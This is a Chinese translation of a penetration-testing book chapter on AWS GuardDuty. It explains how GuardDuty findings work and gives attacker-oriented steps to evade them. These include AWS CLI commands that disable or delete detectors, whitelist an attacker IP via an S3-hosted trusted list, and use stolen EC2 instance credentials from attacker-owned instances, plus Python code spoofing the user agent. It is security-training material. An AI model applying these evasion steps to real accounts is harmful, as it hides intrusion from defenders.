# Kali Linux AWS 渗透测试实用指南（四）

> 原文：[`annas-archive.org/md5/25FB30A9BED11770F1748C091F46E9C7`](https://annas-archive.org/md5/25FB30A9BED11770F1748C091F46E9C7)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第十六章：GuardDuty

作为攻击者，了解目标环境中进行了哪种类型的监视是很重要的，因为它可以并将塑造整个攻击计划。如果我知道某种类型的监视已启用以在发生 XYZ 时触发警报，那么我就不会执行 XYZ，因为我知道我会被抓住。相反，我会选择另一条更有可能不被察觉的路线。如果我知道环境中没有监视，那么我可以采取最简单或最快的路径来实现我的目标，而不必担心触发某些操作的警报。

**亚马逊网络服务**（**AWS**）提供各种安全服务，但主要的安全监控服务是**GuardDuty**。需要注意的是，即使在禁用 GuardDuty 的环境中，这并不意味着没有任何监视。这是因为有许多工具，包括 AWS 内部和第三方工具，提供监视选项。本章将介绍 AWS 监视服务 GuardDuty，这是一个廉价的内部解决方案，用于在环境中捕捉低 hanging fruit。

在本章中，我们将涵盖以下主题：

+   GuardDuty 及其发现简介

+   关于 GuardDuty 发现的警报和反应

+   绕过 GuardDuty

# GuardDuty 及其发现简介

GuardDuty 是 AWS 提供的持续监控服务，可识别并警告账户内的可疑或不需要的行为。目前，它分析三种数据源，即**虚拟私有云**（**VPC**）流日志，CloudTrail 事件日志和**域名系统**（**DNS**）日志。请注意，VPC 流日志和 CloudTrail 事件日志不需要在您的账户上启用 GuardDuty 才能使用它们，目前无法在 AWS 中查看 DNS 日志。这意味着即使环境中没有活动的流日志，并且 CloudTrail 被禁用，GuardDuty 仍将从 VPC 流日志，CloudTrail 事件日志和 DNS 日志生成发现。

还需要注意的是，GuardDuty 只能摄取 DNS 日志，如果请求通过 AWS DNS 解析器路由，则 EC2 实例的默认设置。如果更改了这一设置，并且请求使用其他 DNS 解析器，例如 Google 或 CloudFlare，则 GuardDuty 无法摄取和警报该 DNS 数据。

GuardDuty 也可以进行跨账户管理，其中单个主账户控制一个或多个成员账户的 GuardDuty 监视和配置。如果您发现自己在组织的 GuardDuty 主账户中，您可能能够操纵与其连接的每个账户的监视配置。

有关跨账户 GuardDuty 配置的更多信息，请访问 AWS 文档：[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_accounts.html`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_accounts.html)。

GuardDuty 会针对各种不同的项目生成发现。有关最新列表，请访问[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_finding-types-active.html)以查看生成的活动发现集。

在高层次上，GuardDuty 基本上会警告您可能类似恶意行为的事件，例如如果 EC2 实例正在与已知的恶意软件命令和控制服务器通信，EC2 实例正在与已知的比特币挖矿池通信，或者正在使用已知的黑客操作系统。然后可以设置这些警报以发送通知到`CloudWatch`事件，然后您可以对发现做出反应：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/88b2176a-6be5-406d-ad42-0b5cf081201b.png)

AWS Web 控制台中报告的账户中的 GuardDuty 发现示例列表

大多数 GuardDuty 发现类型依赖于机器学习来建立用户在账户中的正常活动基线。如果某事超出了基线并匹配了该发现类型，它将发出警报。考虑一个拥有两个 IAM 用户和启用了 GuardDuty 的 AWS 账户的例子。其中一个用户经常使用 IAM 服务来管理用户、组和角色，并管理所有这些的权限。另一个用户只使用 EC2 服务，尽管他们有权限做更多的事情。如果这两个用户都尝试枚举 IAM 用户、组或角色的权限，GuardDuty 可能不会触发 IAM 用户，因为这是该用户与 IAM 服务互动的基线。另一方面，EC2 用户可能会生成`Recon:IAMUser/UserPermissions` GuardDuty 发现类型，这表明用户试图枚举账户中的权限（并且这打破了为他们建立的基线）。

有许多 GuardDuty 发现类型非常简单，旨在捕捉攻击者的低挂果。这些类型的发现通常很简单或明显，以至于您不应该触发它们，即使您没有直接考虑它们。其中一些发现包括对 EC2 实例进行端口扫描，对**安全外壳**（**SSH**）/**远程桌面协议**（**RDP**）服务器进行暴力破解，或者使用 Tor 与 AWS 进行通信。在本章中，我们将重点关注更具 AWS 特色的发现和更高级的发现，因为简单的发现类型不一定在本书的范围内，而且它们应该很容易被规避或避免。

另一个需要考虑的重要事项是 GuardDuty 如何使用机器学习和基线来确定是否应该触发发现。如果您处于一个沙盒环境中，因为您正在测试工具和攻击方法，所以不断受到攻击，那么 GuardDuty 可能会将这种活动检测为您账户的基线。如果是这种情况，那么它可能不会触发您期望的某些发现，因为它已经将这种类型的活动在环境中视为正常。

# 关于 GuardDuty 发现的警报和反应

默认情况下，GuardDuty 将生成发现并在 Web 控制台上提供。还可以设置一个 CloudWatch Events 规则来对这些发现做出反应。通过 AWS Web 控制台进行此操作，我们可以导航到 CloudWatch Events 规则页面并创建一个新规则。对于这个规则，我们将选择 GuardDuty 作为要匹配的服务，然后选择 GuardDuty Finding 作为要匹配的事件类型。然后，我们将选择某种目标来发送发现信息。目标可以是各种各样的东西，比如**简单通知服务**（**SNS**）主题，然后将发现的数据发送给安全团队的文本或电子邮件，或者可能是 Lambda 函数，然后根据发现类型做出反应，尝试自动修复它。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/7d67e3d8-1d75-4177-9bc4-269b47379648.png)

创建一个新的 CloudWatch Events 规则，将其定位到一个 Lambda 函数

这张截图显示了一个 CloudWatch Events 规则被创建，以便在 GuardDuty 发现时触发，并在触发时定位到`ExampleFunction` Lambda 函数。这种规则允许您自动化警报和/或防御 GuardDuty 触发的发现。

例如，一个 Lambda 函数可能会解析`CloudWatch` Events 发送的数据，确定触发了什么类型的发现，然后根据此做出反应。例如，如果 GuardDuty 发出警报，EC2 实例正在连接到已知的与加密货币相关的域，Lambda 函数可能会自动阻止该域的出站互联网访问，该域位于 EC2 实例所在的安全组中。您还可以向`CloudWatch` Events 规则添加另一个目标，该规则使用 SNS 向您的安全团队发送短信。这样，如果检测到与加密货币相关的活动，Lambda 函数将自动阻止，并且安全团队将收到警报，然后他们可以决定应该采取什么步骤来适当地再次保护环境。

# 绕过 GuardDuty

GuardDuty 触发的发现有很多，因此有很多方法可以绕过这些检测，以便您不会被抓住。并非所有事情都可以被绕过，但作为攻击者，您至少应该了解 GuardDuty 正在寻找什么，以便在攻击环境时积极努力避免或绕过它。有可能您的活动只会触发一个 GuardDuty 警报，就会关闭您对账户的访问权限，但也有可能没有人真正关注警报的到来，所以在那种情况下您就不需要太担心。

如果您想真的变得更加先进，您还可以故意触发某些 GuardDuty 警报，以便在您悄悄在环境中做其他事情的同时，让任何倾听的防御者陷入困境。此外，如果您知道目标账户正在使用`CloudWatch` Events 来触发 GuardDuty 发现，您甚至可以使用`CloudWatch` Events `PutEvents` API 提供完全虚假的 GuardDuty 发现，这可能会破坏`CloudWatch` Events 规则的目标，因为它包含意外的数据。此外，您还可以以正确的格式发送数据，但只是带有错误的信息，这可能会让防御者和/或他们的自动化在尝试修复发现时感到困惑。

# 用强制绕过一切

我们将要看的第一个绕过方法实际上并不是一个绕过方法，但它将阻止 GuardDuty 对我们的警报。这包括在账户中禁用 GuardDuty 探测器的监控或完全删除它们。您可能不应该使用这种方法，因为它具有破坏性，并且可能对您正在攻击的环境产生重大影响，但知道这是一个选择是很好的。请记住，这个例子只针对单个区域，但可能需要在每个区域运行这些命令，因为 GuardDuty 必须基于每个区域启用。

我们可以使用`ListDetectors`命令识别现有的 GuardDuty 探测器，例如以下内容：

```
 aws guardduty list-detectors 
```

如果我们在当前区域找到一个，我们可以通过运行以下命令来禁用它：

```
aws guardduty update-detector --detector-id <ID of the detector we found> --no-enable 
```

现在我们当前区域的探测器将不再监视和报告任何发现。

我们甚至可以进一步删除探测器，而不是禁用它。我们可以使用以下命令来做到这一点：

```
aws guardduty delete-detector --detector-id <ID of the detector we found> 
```

现在它不存在了，就没有办法监视我们了。

# 用 IP 白名单绕过一切

绕过 GuardDuty 的最佳和最有效的方法就是将您自己的攻击者 IP 地址添加到目标账户的受信任 IP 地址列表中。这是一个简单的过程，GuardDuty 不会触发任何与 GuardDuty 设置的枚举或修改有关的内容，因此它很可能会在更现代、先进的环境中悄悄进行，甚至不会引起注意。如果我们在 AWS 网络控制台的 Lists 选项卡中查看 GuardDuty，我们将看到类似以下截图的内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/5cc880c9-d125-4dd2-bda0-897a23429f0a.png)

在 AWS 网络控制台中显示 GuardDuty 的受信任 IP 列表和威胁列表

在这个截图中，我们可以看到有一个受信任的 IP 列表和威胁列表的部分。它们分别是白名单和黑名单 IP 地址的一种方式，告诉 GuardDuty 要么忽略这些 IP 地址的发现（白名单），要么对这些 IP 地址的一切触发警报（黑名单）。

作为攻击者，这太棒了。我们可以在不触发任何警报的情况下将我们自己的 IP 地址列入白名单，然后在环境中肆无忌惮，而不用担心从那时起 GuardDuty。

当您尝试将自己添加为受信任的 IP 时，可能会遇到一个问题，即 GuardDuty 允许每个区域最多一个受信任的 IP 列表。这意味着如果我们的目标已经使用受信任的 IP 列表，我们将不得不稍微修改我们的攻击。首先要做的是确定他们是否实际上使用了受信任的 IP 列表。请注意，GuardDuty 基于每个区域进行监视，因此可能需要针对每个可用区域中的每个 GuardDuty 检测器重复这些步骤。我们可以通过运行以下 AWS 命令行界面（CLI）命令来做到这一点：

```
   aws guardduty list-detectors 
```

这应该返回当前区域的 GuardDuty 检测器的 ID。在我们的示例中，结果是`e2b19kks31n78f00931ma8b081642901`。如果没有返回检测器 ID，那意味着 GuardDuty 在当前区域未启用，如果您试图绕过它，这是个好消息！然后我们将检查这个检测器，看看它是否已经有一个与之关联的受信任 IP 列表，使用以下命令：

```
 aws guardduty list-ip-sets --detector-id e2b19kks31n78f00931ma8b081642901 
```

如果已经有一个受信任的 IP 集合，它的 ID 将被返回，如果没有，将返回一个空列表。我们将首先看一下的情况假设他们还没有使用受信任的 IP 列表。这对我们来说是最理想的情况。

要开始这次攻击，我们需要在我们的计算机上创建一个文本文件，其中包含我们想要列入白名单的 IP 地址。我们将把这个文件命名为`ip-whitelist.txt`。然后，因为 GuardDuty 要求包含 IP 白名单的文件必须托管在 S3 中，我们将把这个文件上传到我们自己攻击账户中的一个 S3 存储桶，并公开暴露这个文件。这样做的原因是我们始终控制着所使用的白名单，甚至在参与过程中可能需要修改它。在这个示例中，我们将说我们使用`bucket-for-gd-whitelist` S3 存储桶。首先，我们将使用以下命令将我们的文件上传到存储桶中：

```
 aws s3 cp ./ip-whitelist.txt s3://bucket-for-gd-whitelist
```

接下来，我们将确保我们的文件是公开可读的，这样 GuardDuty 在设置为白名单时可以随时读取它。我们可以使用以下命令来做到这一点：

```
aws s3api put-object-acl --acl public-read --bucket bucket-for-gd-whitelist --key ip-whitelist.txt 
```

请记住，存储桶本身或您的帐户的设置可能会阻止公共对象，因此如果在运行此命令时收到访问被拒绝的消息，或者似乎无法工作，请确保存储桶或帐户的公共访问设置已正确配置以允许公共对象。

现在我们的文件应该可以在此 URL 公开访问（仅供本示例使用）：[`s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt`](https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt)。

接下来，我们将使用以下命令为我们之前确定的 GuardDuty 检测器创建新的受信任 IP 列表：

```
 aws guardduty create-ip-set --detector-id e2b19kks31n78f00931ma8b081642901 --format TXT --location https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt --name Whitelist --activate
```

如果这一步成功，你应该会收到一个包含新创建的受信任 IP 集合 ID 的响应。现在就是这样。你的 IP 地址已经在当前区域的 GuardDuty 的受信任 IP 列表中，这意味着 GuardDuty 不会为它生成发现（从 GuardDuty 列表页面）。

正如你可能已经猜到的，Pacu 有一个模块可以自动化这个过程。从 Pacu，我们可以使用`guardduty__whitelist_ip`模块在每个区域执行此操作。我们可以使用以下命令来做到这一点：

```
 run guardduty__whitelist_ip --path https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt
```

完成后，Pacu 将在每个 AWS 区域中将您的 IP 地址列入 GuardDuty 的白名单。

现在我们将看一个场景，目标 AWS 账户已经设置了 GuardDuty 的信任 IP 列表。我们不能只是添加另一个列表，因为每个 GuardDuty 检测器最多只能有一个信任的 IP 列表。我们可以用几种不同的方式来处理这个问题。在运行`ListIPSets`命令并看到确实设置了信任的 IP 列表之后，我们可以直接删除现有的 IP 集，然后实施一个将我们自己的 IP 列入白名单的 IP 集。如果您使用 Pacu，并且 Pacu 检测到已经存在的信任 IP 集，它将提示您删除它并创建您自己的 IP 集，或者跳过该检测器。唯一的问题是，删除现有的信任 IP 白名单可能会在环境中产生意想不到的后果，这意味着在试图保持隐蔽时，我们可能会引起比必要更多的注意。

我们还有另一个选择，即将当前的信任 IP 列表更新为包括我们自己的 IP，以及原来存在的所有 IP。为了做到这一点，让我们从`ListIPSets` API 调用中收集到的 IP 集 ID，并运行`GetIPSet`命令：

```
 aws guardduty get-ip-set --detector-id e2b19kks31n78f00931ma8b081642901 --ip-set-id 37w2992c2274llq7u4121o8af11j4971 
```

如果我们在本节早些时候创建的信任 IP 列表上运行该命令，输出将如下所示：

```
{
    "Format": "TXT",
    "Location": "https://s3.amazonaws.com/bucket-for-gd-whitelist/ip-whitelist.txt",
    "Name": "Whitelist",
    "Status": "ACTIVE"
}
```

我们将把这个信任的 IP 列表视为我们以前没有见过的列表（尽管我们自己设置了它）。我们需要做的是访问 URL 并下载当前的列表，然后修改列表以包括我们自己的攻击者 IP 地址。完成后，我们将按照之前的过程，将这个文件上传到我们自己的个人 S3 存储桶，并使文件公开可读。

完成后，我们将使用`UpdateIPSet` API 而不是之前使用的`CreateIPSet` API。我们可以使用以下命令更新现有的信任 IP 列表为我们的新列表：

```
 aws guardduty update-ip-set --detector-id e2b19kks31n78f00931ma8b081642901 --ip-set-id 37w2992c2274llq7u4121o8af11j4971 --location https://s3.amazonaws.com/our-own-bucket-for-gd-whitelist/our-own-ip-whitelist.txt --activate
```

现在，我们已经用我们自己的 IP 地址更新了信任的 IP 列表，而不会删除任何已经列入白名单的 IP，因此不会在环境中引起任何骚动，可能会引起注意。

作为一个负责任的（聪明的）攻击者，我们还需要跟进一步。这一步是在 AWS 的参与/渗透测试/攻击的最后，我们恢复原始的白名单，这样在查看时配置看起来不会很奇怪，我们的 IP 也不再存储在他们可以访问的列表中。为了做到这一点，我们应该保存最初与信任的 IP 列表相关联的 URL，直到参与结束，然后再次使用`UpdateIPSet` API 将其恢复到该 URL。通过这样做，我们的 IP 在参与期间被 GuardDuty 列入白名单，然后在完成后离开环境，而不对其中的资源进行任何重大修改。

重要的一点是，如果您攻击的账户有另一个外部主账户控制的 GuardDuty，您将无法修改信任的 IP 列表设置。只有主账户在管理 GuardDuty 跨账户时才能做到这一点。当主账户上传信任的 IP 列表时，这个列表将被应用到属于该主账户的所有 GuardDuty 成员身上，这对于已经攻破了 GuardDuty 主账户的攻击者来说是很棒的。

# 绕过 EC2 实例凭据外泄警报

本节将重点关注单个 GuardDuty 发现类型：`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`。AWS 文档描述了当专门为 EC2 实例通过实例启动角色创建的凭据从外部 IP 地址使用时，将触发此发现（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_unauthorized.html#unauthorized11)）。基本上，当启动 EC2 实例并附加 IAM 实例配置文件时，GuardDuty 期望该角色的凭据只能在该单个实例中使用，或者至少是这样的，但我们很快就会讨论这个问题。

这个发现之所以在本章中有自己的部分，是因为在 AWS 的参与中，出现了有可能触发它的情况非常普遍。我们在渗透测试中发现的获取这些凭据的最常见方法是在具有 IAM 实例配置文件的 EC2 实例上获得服务器端请求伪造。然后，您可以向 EC2 元数据 URL（[`169.254.169.254/`](http://169.254.169.254/)）发出 HTTP 请求并请求这些凭据。在这种情况下，您无法在服务器上执行命令，因此需要将获取的凭据外泄以使用它们。这就是 GuardDuty 发现介入并识别 EC2 实例凭据来自外部 IP 地址的地方。

尽管这个 GuardDuty 发现是在攻击环境中遇到的最常见的之一，但它也是最容易完全绕过的之一。需要注意的重要事情是，当文档说，“*正在使用* *外部 IP 地址时，”它指的是一个对所有 EC2 都是外部的 IP 地址，并不是指 EC2 实例附加的 IAM 实例配置文件外部的 IP 地址。

鉴于这些信息，绕过很简单。我们只需要在我们自己的攻击者帐户中启动一个 EC2 实例（如果我们知道的话，可以在与我们 SSRF 的服务器相同的区域中启动，以便源 IP 在区域范围内），使用 AWS CLI，Pacu 等配置凭据，然后开始入侵。对于 Pacu，您只需要运行`set_keys`命令，并输入从目标 EC2 实例窃取的访问密钥 ID，秘密访问密钥和会话令牌，然后您就可以运行任何模块或 API 命令，而不必担心 GuardDuty `UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`警报。

要在我们自己的帐户中启动此 EC2 实例，运行 Ubuntu Server 18.04 LTS，我们可以运行以下命令，然后用您在 AWS EC2 中创建的 SSH 密钥的名称替换`<your ec2 ssh key name>`（您需要修改镜像 ID 和区域参数值以在`us-east-1`以外的区域运行此命令）：

```
 aws ec2 run-instances --region us-east-1 --image-id ami-0ac019f4fcb7cb7e6 --instance-type t2.micro --key-name <your ec2 ssh key name> --count 1 --user-data file://userdata.txt
```

`userdata.txt`文件应包含以下内容，将安装`Python3`，`Pip3`，`Git`，AWS CLI 和`Pacu`：

```
#!/bin/bash
apt-get update
apt-get install python3 python3-pip git -y
pip3 install awscli
cd /root
git clone https://github.com/RhinoSecurityLabs/pacu.git
cd pacu/
/bin/bash install.sh
```

启动实例后，您可以使用在命令行中提供的 SSH 密钥进行 SSH 连接。然后，我们可以运行以下命令：

+   `sudo su`

+   `cd /root/pacu`

+   运行`python3 pacu.py`

+   `set_keys`

在这一点上，您将被提示将您的角色凭据输入 Pacu，以便您可以开始。如果在尝试更改目录到`/root/pacu`时不存在该文件夹，则可能实例仍在安装用户数据脚本中定义的各种软件。等一两分钟然后再次检查。如果仍然没有显示，请查看`/var/log/cloud-init-output.log`文件的内容，看看在安装任何前述软件期间是否有任何错误，或者它是否仍在运行。

现在，只要您留在这个实例内部，您就不需要担心 GuardDuty 发现的警报，但是如果您移动到 EC2 IP 范围之外，很可能会在您的第一个 API 调用时触发警报。

另一个重要的观点是，`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration` GuardDuty 警报只针对您账户中的 EC2 实例。这意味着，如果您通过某些其他 AWS 服务托管的服务器获得了凭据，这个 GuardDuty 警报不会关注您对这些凭据的使用。这意味着，如果您在 Lambda 函数上获得了远程代码执行，并从环境变量中窃取了凭据，您可以将其转移到任何系统并使用，而不用担心被这种特定的 GuardDuty 发现类型检测到。对于 AWS Glue 开发端点也是一样；如果您从 Glue 开发端点的元数据 API 中窃取了凭据，您可以将其转移到任何地方而不用担心，因为 GuardDuty 不会追踪它们。

Glue 是一个有趣的例子，因为开发端点基本上似乎是在别人的账户中启动的 EC2 实例（由 AWS 自己拥有），当然有一些修改。这意味着从 Glue 开发端点中窃取凭据实际上可能会触发 AWS 自己拥有的 AWS 账户中的 GuardDuty 警报，但这对我们攻击者来说并不重要，因为我们的目标不会拥有这些信息。

# 绕过操作系统（渗透测试）警报

在`PenTest`发现类型的 GuardDuty 警报下有三个警报。这些发现是`PenTest:IAMUser/KaliLinux`、`PenTest:IAMUser/ParrotLinux`和`PenTest:IAMUser/PentooLinux`，当从 Kali Linux 服务器、Parrot Linux 服务器或 Pentoo Linux 服务器发出 AWS API 调用时会触发警报。只要您知道是什么导致了这些警报被检测到，就很容易绕过它们。

无论您使用什么客户端与 API 交互，无论是来自受支持的各种语言的 SDK（如 Java、Python 或 Node.js），AWS CLI（在后台使用 Python），AWS web 控制台，还是原始的 HTTP 请求，您都将始终有一个用户代理来描述您的操作系统和版本，以及在进行请求时使用的其他软件及其版本。然后，CloudTrail 会记录这个用户代理字符串，就像我们在第十五章中看到的那样，*渗透测试 CloudTrial*。

在 Kali Linux 上使用 AWS CLI 时发送的示例用户代理如下所示：

```
 aws-cli/1.16.89 Python/3.6.8 Linux/4.19.0-kali1-amd64 botocore/1.12.79 
```

这个用户代理告诉我们一些事情：

+   使用 AWS CLI，版本为 1.16.89，进行了请求。

+   AWS CLI 在后台使用 Python 版本 3.6.8。

+   操作系统是带有 4.19.0 内核版本的 Kali Linux，运行在 AMD 64 上。

+   Python 正在使用`botocore`库的 1.12.79 版本。

在 Parrot Linux 上使用 AWS CLI 时发送的示例用户代理如下所示：

```
 aws-cli/1.16.93 Python/3.6.8 Linux/4.19.0-parrot1-13t-amd64 botocore/1.12.83
```

这个用户代理告诉我们一些事情：

+   使用 AWS CLI，版本为 1.16.93，进行了请求。

+   AWS CLI 在后台使用 Python 版本 3.6.8。

+   操作系统是带有 4.19.0 内核版本的 Parrot Linux，运行在 AMD 64 上。

+   Python 正在使用`botocore`库的 1.12.83 版本。

在 Pentoo Linux 上使用 AWS CLI 时发送的示例用户代理如下所示：

```
[aws-cli/1.16.93 Python/2.7.14 Linux/4.17.11-pentoo botocore/1.12.83] 
```

这个用户代理告诉我们一些事情：

+   使用 AWS CLI，版本为 1.16.93，进行了请求。

+   AWS CLI 在后台使用 Python 版本 2.7.14。

+   操作系统是带有 4.17.11 内核版本的 Pentoo Linux。

+   Python 正在使用`botocore`库的 1.12.83 版本。

在使用 AWS web 控制台时，大多数 CloudTrail 日志将使用以下用户代理：

```
   signin.amazonaws.com 
```

这个用户代理告诉我们用户是登录到 AWS web 控制台，而不是使用其他与 API 交互的方法。

对于 Kali、Parrot 和 Pentoo Linux 用户代理，我们可以看到它们都包含各自的操作系统名称（`kali`、`parrot`、`pentoo`）。这基本上是 GuardDuty 用来识别这些操作系统使用的内容，当报告`PenTest`发现类型时。

要获得自己的用户代理，您可以对 API 进行任何 AWS 请求，该请求将被记录在 CloudTrail 中，然后您可以查看该 CloudTrail 事件的详细信息，以查看记录的用户代理是什么。如果您使用 Python 的`boto3`库与 AWS API 进行交互，您可以使用以下代码行来打印出您的用户代理是什么：

```
print(boto3.session.Session()._session.user_agent())
```

为了避免这些 GuardDuty 检查，即使我们使用 Kali Linux、Parrot Linux 或 Pentoo Linux，我们只需要在向 AWS API 发出请求之前修改我们使用的用户代理。只要 GuardDuty 在我们的用户代理中没有检测到`kali`、`parrot`或`pentoo`，那么我们就没问题。

以下代码块显示了一个小例子，我们如何检测这些操作系统中的任何一个，如何在那种情况下更改用户代理，然后如何成功地使用修改后的用户代理进行请求。这段代码遵循了我们在整本书中一直遵循的相同的 Python 3 与`boto3`模式：

```
import random

import boto3
import botocore

# A list of user agents that won't trigger GuardDuty
safe_user_agents = [
 'Boto3/1.7.48 Python/3.7.0 Windows/10 Botocore/1.10.48',
 'aws-sdk-go/1.4.22 (go1.7.4; linux; amd64)',
 'aws-cli/1.15.10 Python/2.7.9 Windows/8 botocore/1.10.10'
]

# Grab the current user agent
user_agent = boto3.session.Session()._session.user_agent().lower()

# Check if we are on Kali, Parrot, or Pentoo Linux against a lowercase version of the user agent
if 'kali' in user_agent.lower() or 'parrot' in user_agent.lower() or 'pentoo' in user_agent.lower():
 # Change the user agent to a random one from the list of safe user agents
 user_agent = random.choice(safe_user_agents)

# Prepare a botocore config object with our user agent
botocore_config = botocore.config.Config(
 user_agent=user_agent
)

# Create the boto3 client, using the botocore config we just set up
client = boto3.client(
 'ec2',
 region_name='us-east-1',
 config=botocore_config
)

# Print out the results of our EC2 DescribeInstances call
print(client.describe_instances())
```

基本上，所有这些代码所做的就是检查我们的客户端的用户代理字符串中是否包含`kali`、`parrot`或`pentoo`，如果是，就将其更改为已知的安全用户代理。这样修改我们的请求将允许我们完全规避 GuardDuty 进行的 PenTest/用户代理检查。

尽管直接使用`boto3`库很容易规避这些 GuardDuty 检查，但在使用 AWS CLI 时会有点棘手（尽管不是不可能）。您还需要将此代码添加到您正在使用的任何其他软件中，以确保在攻击期间永远不会被检测到；然而，幸运的是，Pacu 已经考虑到了这一点。

启动 Pacu（`python3 pacu.py`）时，这个检查 Kali、Parrot 和 Pentoo Linux 的操作将自动为您执行。如果 Pacu 检测到您正在运行其中任何一个操作系统，那么它将自动从本地存储的列表中选择一个已知的安全用户代理，并将使用这个新的用户代理进行 Pacu 发出的任何和所有 AWS 请求。这个检查将应用于创建的整个 Pacu 会话，因此只有在创建 Pacu 会话时才会看到更改已经进行的警告。如果您将该会话移动到另一台计算机，它将保留最初选择的用户代理，因此所有请求在 CloudTrail 中都显示为一致的。

在 Pacu 启动时，当您在我们一直在关注的三个操作系统中的一个上创建新会话时，您会看到以下消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-aws-pentest-kali/img/42d02d1d-c7d8-48e1-aa21-2cd0dbf870a6.png)

Pacu 中的内置 GuardDuty 防御

现在，任何检查 CloudTrail 日志的人都会看到我们正在使用的是 Windows 10，而不是 Kali Linux。这意味着 GuardDuty 也会看到同样的情况，并不会对我们触发任何发现。

尽管这些发现列在`PenTest`GuardDuty 类别下，听起来并不一定恶意，但这些检查是我们可以努力规避的最重要的检查之一。这是因为使用这三个操作系统中的任何一个都会对知道它们在其环境中通常（或从未）使用的防御者看起来非常可疑，这意味着我们的攻击很可能会在短时间内被调查和停止。

在这种情况下修改我们的用户代理时，可能并不总是有意义使用一个看似随机的用户代理作为我们的替代。比如说，我们妥协了一个严格使用 AWS Java SDK 进行 API 调用的帐户，但我们妥协了一个用户并更改了我们的用户代理以反映我们使用 Python `boto3`库。这将引起任何留意这种事情的防御者的怀疑。由于用户代理由用户控制，这种类型的检测非常不可靠，所以你可能不经常遇到，但还是值得注意。

为了击败任何用户代理检测，我们可能需要审查目标帐户的 CloudTrail 日志，以找到我们已经妥协的用户之前进行的 API 调用。然后，我们可以复制该用户代理并将其用作我们自己的，一举两得。我们将隐藏我们使用 Kali、Parrot 或 Pentoo Linux 的事实，并通过使用以前见过的用户代理来适应环境的规范。

# 其他简单的规避方法

与我们之前讨论的类似，GuardDuty 检查了许多不同的事情，因此每一种可能都需要其自己的规避方法。

我们可以遵循的最简单的规则来规避`low-hanging-fruit` 检查包括以下内容：

+   不要使用 Tor 网络与 AWS 通信

+   不要从 EC2 实例扫描端口

+   不要暴力破解 SSH/RDP 服务器

+   不要与已知的恶意网络、主机或 IP 通信

还有一些其他的事情我们应该记住。

# 加密货币

如果我们想要挖掘加密货币（在合法的渗透测试期间绝对不应该这样做），我们将要查看`CryptoCurrency:EC2/BitcoinTool.B!DNS` 和`CryptoCurrency:EC2/BitcoinTool.B` GuardDuty 警报。这些警报会触发与已知与加密货币相关的活动相关的域名和 IP 地址的网络活动（[`docs.aws.amazon.com/guardduty/latest/ug/guardduty_crypto.html`](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty_crypto.html)）。这意味着我们可以通过避免直接连接到已知的与加密货币相关的域名和 IP 地址，如交易所和矿池，来规避这一点。

# 行为

规避 GuardDuty 行为检查也可能非常简单。

要规避`Behavior:EC2/NetworkPortUnusual` 发现，当 EC2 实例与不寻常端口上的远程主机通信时触发，我们只需要确保我们正在执行的任何恶意软件命令和控制使用常见端口，如`80`（HTTP）或`443`（HTTPS），而不是一些随机的高端口。

`Behavior:EC2/TrafficVolumeUnusual` GuardDuty 发现在向远程主机发送异常大量网络流量时触发。作为防御者，这可能表明内部网络中存在数据外泄的迹象。作为攻击者，我们可以通过限制出站带宽来规避这一发现，以便一次性发生的流量量不会很大。相反，会在较长时间内发生少量的流量。

# ResourceConsumption

`ResourceConsumption:IAMUser/ComputeResources` GuardDuty 发现在检测到旨在将计算资源（EC2）启动到帐户中的 API 时触发。我们可以通过避免在 GuardDuty 监控的区域使用`RunInstances` EC2 API 来规避这一发现类型。如果每个区域都没有被监控，我们可以在未被监控的区域启动我们的 EC2 实例；然而，如果每个区域都被监控，那么我们可以通过完全避免 API 调用或使用其他 AWS 服务来启动我们需要的服务器来规避这一点。

我们可以通过使用 AWS 内的许多服务之一来做到这一点，这些服务也会启动服务器，其中一些包括**Lightsail**实例、Glue 开发端点或**AppStream**实例。在这些情况下，我们仍然会在目标账户内启动服务器，但它们不会被 GuardDuty 检测到，因为我们已经避免了`RunInstances` EC2 API。

# 隐蔽

我们已经讨论了 GuardDuty 发现类型中与 CloudTrail 相关的两种，但在**隐蔽**类别下还有第三种：`Stealth:IAMUser/PasswordPolicyChange`。当账户的密码策略被削弱时，比如最小密码长度从 15 个字符变为 8 个字符时，就会触发这个发现。为了避免这种情况，我们简单地不应该触碰我们正在攻击的账户内的密码强度要求。

# 特洛伊木马

GuardDuty 的特洛伊木马类别中的大多数发现可以通过永远不与已知的恶意 IP 地址和域通信来避免，这很容易做到。然而，有一个发现，`Trojan:EC2/DNSDataExfiltration`，有点不同。当发现 EC2 实例通过 DNS 查询外泄数据时，就会触发这个发现。为了避免这种情况，我们可以简单地决定不在受损的 EC2 实例内使用 DNS 数据外泄的方法。

此外，正如之前讨论的，GuardDuty 只能读取使用 AWS DNS 服务器的 DNS 请求的 DNS 日志。可能可以定制你的恶意软件使用替代 DNS 解析器（而不是 AWS DNS 的 EC2 默认值）进行 DNS 外泄，这将完全绕过 GuardDuty，因为它永远不会看到这些流量。

# 其他

还有其他 GuardDuty 发现类别我们没有讨论，这是因为它们通常更难绕过，需要特定情况下的攻击，或者它们被包含在我们已经讨论过的另一个主题中。

# 总结

